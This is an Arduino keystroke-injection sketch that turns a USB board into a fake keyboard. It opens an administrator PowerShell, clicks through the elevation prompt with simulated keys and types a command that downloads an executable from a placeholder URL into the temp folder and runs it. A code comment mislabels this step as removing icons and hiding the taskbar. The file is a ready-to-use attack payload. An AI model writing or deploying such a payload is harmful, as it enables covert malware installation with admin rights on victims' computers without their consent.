#include <Keyboard.h>

// Press & release function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
  delay(150);
}

// Windows + key combination
void winKey(int key){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(key);
  Keyboard.releaseAll();
  delay(250);
}

  // Start powershell as administrator
void powershellAdmin(){
  winKey(114);
  Keyboard.print("powershell.exe");
  delay(250);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  typeKey(KEY_LEFT_ARROW);
  typeKey(KEY_RETURN);
  delay(500);  
}

  // Hit return key with delays to let slower PC process
void enter(){
  delay(250);
  typeKey(KEY_RETURN);
  delay(350);
}

void setup()
{

  // If the button is pressed, payload doesn't start
  pinMode(3, INPUT_PULLUP);
  if (digitalRead(3) == LOW){
    while(1);
  }
  
  Keyboard.begin();

  // Start Payload
  delay(3000);

  // Show desktop (minimize all windows)
  winKey(100);

  // BEGIN : This is for an AZERTY layout keyboard :
  winKey(114);
  Keyboard.print("pozershell<exe Set6ZinUserLqnguqgeList 6LqnguqgeList en6US");
  enter();
  enter();
  // END
  
  // Removing icons and setting taskbar to auto hide on top
  powershellAdmin(); 
  Keyboard.print("(new-object System.Net.WebClient).DownloadFile('URL TO YOUR EXE HERE','%TEMP%/f.exe'); Start-Process \"%TEMP%/f.exe\"");
  
  // BEGIN : This is for an AZERTY layout keyboard :
  winKey(114);
  Keyboard.print("powershell.exe Set-WinUserLanguageList -LanguageList fr-FR");
  enter();
  enter();
  // END
  enter();
  
  // End Payload

  Keyboard.end();
}


void loop() {}
